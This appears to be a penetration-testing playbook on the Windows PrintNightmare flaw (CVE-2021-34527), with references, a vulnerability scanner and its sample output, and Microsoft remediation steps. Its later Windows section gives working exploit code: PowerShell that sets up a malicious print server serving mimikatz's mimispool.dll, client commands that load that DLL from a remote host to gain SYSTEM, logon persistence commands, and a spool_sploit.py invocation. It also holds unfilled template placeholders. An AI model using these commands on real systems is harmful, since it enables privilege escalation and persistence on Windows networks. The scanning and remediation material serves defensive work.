<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Print Nightmare
### Tags
		#@printnightmare #@CVE-2021-34527 #@rce #@Windows #@LPE
## References

* Microsoft Resources
    * Vulnerability Description
        * MSRC: Windows Print Spooler Remote Code Execution Vulnerability (CVE-2021-34527) -<br />[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
    * Documentation for remediation
        * Microsoft Docs: Use Group Policy settings to control printers in Active Directory -<br />[https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer](https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer)
        * Group Policy Home: Package Point and print - Approved servers -<br />[https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintServerList](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintServerList)
* Original tweets around the matter
    * Benjamin Delpy
        * (@gentilkiwi) [https://twitter.com/gentilkiwi/status/1420069224106577927](https://twitter.com/gentilkiwi/status/1420069224106577927)
        * Prevention -<br />[https://twitter.com/gentilkiwi/status/1416429891592011781](https://twitter.com/gentilkiwi/status/1416429891592011781)
        * Flow chart of affected devices -<br />[https://twitter.com/gentilkiwi/status/1412483747321192451](https://twitter.com/gentilkiwi/status/1412483747321192451)

### Enumeration
### From a Linux Machine

* <details><summary>PrintNightmare (Click to expand)</summary><p>
	* Recommended: PrintNightmare Scanner (ly4k) -<br />[https://github.com/ly4k/PrintNightmare](https://github.com/ly4k/PrintNightmare)

			.

# Overview

**Quick Notes**

* RCE + LPE Exists in Print Spooler Service
* All Windows versions are affected (Workstations, Servers, DCs)
* The vulnerability affected patched Windows systems with the **Point and Print** configuration enabled

A remote code execution (RCE) vulnerability that can be used to obtain SYSTEM level privileges by an authenticated remote user against Windows machines running the print spooler service. An attacker could then use that access to create new accounts, attempt to install programs; view, change, or delete data; or create new accounts with full user rights.

This vulnerability exists due to an authorisation bypass bug in the Print Spooler service spoolsv.exe on Windows systems, which allows authenticated remote users to install print drivers using the RPC call `RpcAddPrinterDriver` and specify a driver file located on a remote location. A malicious user exploiting this could obtain SYSTEM level privileges on a Windows system running this service by injecting malicious DLLs as part of installing a print driver.

Microsoft has released a patch for CVE-2021-1675. However, the patch does not protect Active Directory domain controllers or Windows systems with **Point and Print** configured with the `NoWarningNoElevationOnInstall` option configured.

## Tools and Techniques

* ItWasAllADream (scanning tool; de-fanged version of the exploit)
* Untested or Not Working Tools:
    * https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 - As of 2021.07.27, this was last updated 2021.07.03
    * https://github.com/cube0x0/CVE-2021-1675 - As of 2021.07.27, this was last updated 2021.07.08
    * https://github.com/LuemmelSec/impacket/tree/PrintNightmare - As of 2021.07.27, this was last updated 2021.07.11. Included a fork to impacket.

## TTP 1 - Scanning: ItWasAllADream
### References
* ItWasAllADream GitHub [https://github.com/byt3bl33d3r/ItWasAllADream/](https://github.com/byt3bl33d3r/ItWasAllADream/)

* #@scan
* Scan targets (CIDR/subnets, file defined, or specific targets) for the PrintNightmare RCE vulnerability. This does not check for the local privilege escalation (LPE). The scan generates a report (.csv) with the results. 
* [GitHub](https://github.com/byt3bl33d3r/ItWasAllADream/)
* Warnings, Disclaimers
	* This appears to be safe to use. It should not be performing any exploit. #@TODO review more closely

### Example 1 - Using Docker

#### Full Syntax

Docker method is the simplest approach.

```
docker build -t itwasalladream .
docker run -it itwasalladream -u <user> -p <password> -d <domain.tld> <target>
```

**Common or Required Parameters**

* `-u <username>` - Valid username for target systems.
* `-p <password>` - Valid password for target systems. If this is not specified, a prompt will follow.
* `-d <domain>` - Include the local domain that the scanner will run in.

**Other Noteworthy Parameters**

* `--csv-column` - "If target argument is a CSV file, this argument specifies which column to parse (default: DNSHostName)"

	* ExamplesUsage

**Scenario 1 - Scan the network with a CIDR address**

```
docker run -it itwasalladream -u User -p Password -d domain.local 10.0.0.0/8
```

**Scenario 2 - Scan the network using a csv file to define targets**

```
docker run -it itwasalladream -u User -p Password -d domain.local --csv-column Targets targets.csv
```

#### Output

**What to look for in output**

* Hosts with "Point & Print" enabled
* Confirm the report is generated at the end

##### Sample Output

* A successful run of the scan using docker. The hosts are all patched, but are vulnerable over both MS-PAR and MS-RPRN.

```
lab_user@gateway0:~$ sudo docker run -it itwasalladream -u user -p password -d domain.local 10.0.0.4/30
[itwasalladream] INFO - 10.0.0.4 is vulnerable over MS-PAR. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled. Re-trying with known UNC bypass to validate.
[itwasalladream] INFO - 10.0.0.6 is vulnerable over MS-PAR. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled. Re-trying with known UNC bypass to validate.
[itwasalladream] INFO - 10.0.0.7 is vulnerable over MS-PAR. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled. Re-trying with known UNC bypass to validate.
[itwasalladream] INFO - 10.0.0.7 is vulnerable over MS-RPRN. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled. Re-trying with known UNC bypass to validate.
[itwasalladream] INFO - 10.0.0.4 is vulnerable over MS-RPRN. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled. Re-trying with known UNC bypass to validate.
[itwasalladream] INFO - 10.0.0.6 is vulnerable over MS-RPRN. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled. Re-trying with known UNC bypass to validate.
[itwasalladream] INFO - completed: 100.00% (4/4)
[itwasalladream] INFO - completed: 100.00% (4/4)
[itwasalladream] INFO - 10.0.0.6 is vulnerable over MS-PAR. Reason: Host attempted to grab DLL from supplied share
[itwasalladream] INFO - 10.0.0.6 is vulnerable over MS-RPRN. Reason: Host attempted to grab DLL from supplied share
[itwasalladream] INFO - 10.0.0.4 is vulnerable over MS-PAR. Reason: Host attempted to grab DLL from supplied share
[itwasalladream] INFO - 10.0.0.4 is vulnerable over MS-RPRN. Reason: Host attempted to grab DLL from supplied share
[itwasalladream] INFO - 10.0.0.7 is vulnerable over MS-PAR. Reason: Host attempted to grab DLL from supplied share
[itwasalladream] INFO - 10.0.0.7 is vulnerable over MS-RPRN. Reason: Host attempted to grab DLL from supplied share
[itwasalladream] INFO - Scan complete, generating report. Please wait...
[itwasalladream] INFO - report_2021_07_15_203853.csv generated successfully
```

#### Detection

* {notes, splunk queries, etc.} #@TODO

### Example <Number, starting at 1>

{Continued list of examples}

## Remediation

1. Determine if the Print Spooler service is running by executing the following in PowerShell:

```PowerShell
Get-Service -Name Spooler
```
2. If the Print Spooler servoce is active, complete one of the following options: select one of the following options to either disable the Print Spooler service, or to Disable inbound remote printing through Group Policy:

### Method 1: Disable the service

Use one of the following options to disable the service using PowerShell.

* The commands recommended by Microsoft:
```PowerShell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```
* Disable the Spooler service through the registry:
```PowerShell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```
* Uninstall Print-Services. This will disable the ability to print both locally and remotely.
```PowerShell
Uninstall-WindowsFeature Print-Services
```

### Method 2: Disable inbound remote printing through Group Policy

1. Configure the settings via Group Policy as follows:
    * `Computer Configuration / Administrative Templates / Printers`
2. Disable the “Allow Print Spooler to accept client connections” policy to block remote attacks.

This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no longer function as a print server, but local printing to a directly attached device will still be possible.

#### Remediation References

* Use Group Policy settings to control printers. [https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer](https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer)

### From a Windows Machine

* <details><summary>PrintNightmare (Click to expand)</summary><p>
	* 

## Print Nightmare
---
#### Install Server:

```
$printerName     = 'Kiwi Legit Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
```
 
```
#Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
#Expand-Archive -Force -Path '.\mimikatz_trunk.zip' -DestinationPath '.\mimikatz_trunk'

 

Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')

 

Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared

 

New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null

 

New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null

 

New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null

 

New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```

#### Uninstall Server:

```
$printerName     = 'Kiwi Legit Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'

 

Remove-Printer       -Name $printerName
Start-Sleep -Seconds 2
Remove-PrinterDriver -Name 'Generic / Text Only'

 

Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
Remove-Item -Force -Path ($system32 + '\mimispool.dll')

 


```

 

#### Exploit client


```
$serverName  = 'PRINTSRV.local'
$username    = 'user'
$password    = 'P@ssw0rd'
$printerName = 'Kiwi Legit Printer'

 

$fullprinterName = '\\' + $serverName + '\' + $printerName
$credential = (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString -AsPlainText -String $password -Force)))

 

Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue

 

New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $serverName + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
Add-Printer -ConnectionName $fullprinterName

 

$driver = (Get-Printer -Name $fullprinterName).DriverName
Remove-Printer -Name $fullprinterName
Remove-PrinterDriver -Name $driver
Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'

 


```
OR
```
net use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password
rundll32 printui.dll,PrintUIEntry /in /n"\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
```

 


#####Loads malicious dll everytime a user logs on by running the below commands from a normal user context:
```
rundll32 printui,PrintUIEntry /ga /n"\\print.lab.local\Kiwi Legit Printer"
```
OR
```
reg add "HKCU\Printers\Connections\,,print.lab.local,Kiwi Legit Printer" /f /v Provider /t REG_SZ /d win32spl.dll
```



python3 spool_sploit.py -a nightmare -lS '\\10.0.0.4\printer\printer.dll' -d lab.local -u low_user -p 'P@ssw0rd12345' -rP 445 -rH 10.0.0.5